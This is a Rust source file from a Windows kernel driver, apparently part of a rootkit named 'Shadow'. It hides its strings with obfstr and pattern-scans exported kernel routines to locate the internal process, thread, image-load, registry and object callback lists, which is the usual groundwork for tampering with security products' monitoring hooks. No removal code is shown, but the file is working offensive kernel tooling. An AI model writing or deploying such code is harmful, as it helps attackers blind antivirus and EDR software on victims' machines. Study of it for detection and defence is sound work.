use obfstr::obfstr as s;
use wdk_sys::{
    PsProcessType, 
    PsThreadType, 
    ntddk::MmGetSystemRoutineAddress
};

use common::enums::Callbacks;
use crate::utils::{
    patterns::scan_for_pattern, 
    uni::str_to_unicode
};
use crate::{
    Result,
    data::FULL_OBJECT_TYPE,
    error::ShadowError,
};

/// This module implements various types of callbacks used throughout the project.
mod callbacks;
pub use callbacks::*;

/// Finds the address of the `PsSetCreateProcessNotifyRoutine` routine.
///
/// # Returns
///
/// * `Ok(*mut u8)` - The pointer to the routine's address if found.
/// * `Err(ShadowError)` - If the pattern is not found or an error occurs during scanning.
unsafe fn find_ps_create_process() -> Result<*mut u8> {
    let mut name = str_to_unicode(s!("PsSetCreateProcessNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // call nt!PspSetCreateProcessNotifyRoutine (xxx)
    let instructions = [0xE8];
    let psp_set_create_process = scan_for_pattern(function_address, &instructions, 1, 5, 0x14)?;

    let instructions = [0x4C, 0x8D, 0x2D];
    scan_for_pattern(psp_set_create_process.cast(), &instructions, 3, 7, 0x98)
}

/// Finds the address of the `PsRemoveCreateThreadNotifyRoutine` routine.
///
/// # Returns
///
/// * `Ok(*mut u8)` - The pointer to the routine's address if found.
/// * `Err(ShadowError)` - If the pattern is not found or an error occurs during scanning.
unsafe fn find_ps_create_thread() -> Result<*mut u8> {
    let mut name = str_to_unicode(s!("PsRemoveCreateThreadNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // lea rcx,[nt!PspCreateThreadNotifyRoutine (xxx)]
    let instructions = [0x48, 0x8D, 0x0D];
    scan_for_pattern(function_address, &instructions, 3, 7, 0x50)
}

/// Finds the address of the `PsSetLoadImageNotifyRoutineEx` routine.
///
/// # Returns
///
/// * `Ok(*mut u8)` - The pointer to the routine's address if found.
/// * `Err(ShadowError)` - If the pattern is not found or an error occurs during scanning.
unsafe fn find_ps_load_image() -> Result<*mut u8> {
    let mut name = str_to_unicode(s!("PsSetLoadImageNotifyRoutineEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // lea rcx,[nt!PspLoadImageNotifyRoutine (xxx)]
    let instructions = [0x48, 0x8D, 0x0D];
    scan_for_pattern(function_address, &instructions, 3, 7, 0x50)
}

/// Finds the address of the `CmRegisterCallbackEx` routine.
///
/// # Returns
///
/// * `Ok((*mut u8, *mut u8, *mut u8))` - A tuple containing the callback list head, callback count,
///   and the callback list lock if found.
/// * `Err(ShadowError)` - If the pattern is not found or an error occurs during scanning.
unsafe fn find_cm_register_callback() -> Result<(*mut u8, *mut u8, *mut u8)> {
    let mut name = str_to_unicode(s!("CmRegisterCallbackEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // call nt!CmpRegisterCallbackInternal
    let register_internal_pattern = [0xE8];
    let register_callback_internal =
        scan_for_pattern(function_address, &register_internal_pattern, 1, 5, 0x50)?;

    // call nt!CmpInsertCallbackInListByAltitude
    let insert_pattern: [u8; 3] = [0x8B, 0xCB, 0xE8];
    let insert_call_address = scan_for_pattern(
        register_callback_internal.cast(),
        &insert_pattern,
        3,
        7,
        0x108,
    )?;

    // lea rcx,[nt!CmpCallbackListLock (xxx)]
    let cmp_callback_list_lock_pattern = [0x48, 0x8D, 0x0D];
    let callback_list_lock = scan_for_pattern(
        insert_call_address.cast(),
        &cmp_callback_list_lock_pattern,
        3,
        7,
        0x200,
    )?;

    // lea r15,[nt!CallbackListHead (xxx)]
    let callback_list_head_pattern = [0x4C, 0x8D, 0x3D];
    let callback_list_header = scan_for_pattern(
        insert_call_address.cast(),
        &callback_list_head_pattern,
        3,
        7,
        0x200,
    )?;

    // lock inc dword ptr [nt!CmpCallBackCount (xxx)]
    let cmp_callback_count_pattern = [0xF0, 0xFF, 0x05];
    let callback_count = scan_for_pattern(
        insert_call_address.cast(),
        &cmp_callback_count_pattern,
        3,
        7,
        0x200,
    )?;

    Ok((callback_list_header, callback_count, callback_list_lock))
}

/// Finds the address of the `ObRegisterCallbacks` routine.
///
/// # Arguments
///
/// * `callback` - A reference to the `Callbacks` enum specifying the target callback.
///
/// # Returns
///
/// * `Ok(*mut FULL_OBJECT_TYPE)` - The pointer to the object type associated with the callback if found.
/// * `Err(ShadowError)` - If the callback type is not recognized or an error occurs.
pub fn find_ob_register_callback(callback: &Callbacks) -> Result<*mut FULL_OBJECT_TYPE> {
    match callback {
        Callbacks::ObProcess => Ok(unsafe { (*PsProcessType) as *mut FULL_OBJECT_TYPE }),
        Callbacks::ObThread => Ok(unsafe { (*PsThreadType) as *mut FULL_OBJECT_TYPE }),
        _ => Err(ShadowError::PatternNotFound),
    }
}

/// Finds the address of the specified callback routine.
///
/// # Arguments
///
/// * `callback` - A reference to the `Callbacks` enum specifying the target callback.
///
/// # Returns
///
/// * `Ok(CallbackResult)` - A result containing the address of the callback or related components.
/// * `Err(ShadowError)` - If the callback is not found or an error occurs.
pub unsafe fn find_callback_address(callback: &Callbacks) -> Result<CallbackResult> {
    match callback {
        Callbacks::PsSetCreateProcessNotifyRoutine => {
            find_ps_create_process().map(CallbackResult::Notify)
        }
        Callbacks::PsSetCreateThreadNotifyRoutine => {
            find_ps_create_thread().map(CallbackResult::Notify)
        }
        Callbacks::PsSetLoadImageNotifyRoutine => { 
            find_ps_load_image().map(CallbackResult::Notify)
        }
        Callbacks::CmRegisterCallbackEx => {
            find_cm_register_callback().map(CallbackResult::Registry)
        }
        Callbacks::ObProcess | Callbacks::ObThread => {
            find_ob_register_callback(callback).map(CallbackResult::Object)
        }
    }
}

/// Enum representing the return types for various callback searches.
///
/// This enum holds the result of searching for a specific callback routine.
/// The variants store the associated memory addresses for the found callbacks.
pub enum CallbackResult {
    /// Holds the address for process/thread/image creation notifications.
    Notify(*mut u8),

    /// Holds the addresses for the registry callback, 
    /// including the callback list and callback count.
    Registry((*mut u8, *mut u8, *mut u8)),

    /// Holds the address for object process/thread callbacks.
    Object(*mut FULL_OBJECT_TYPE),
}
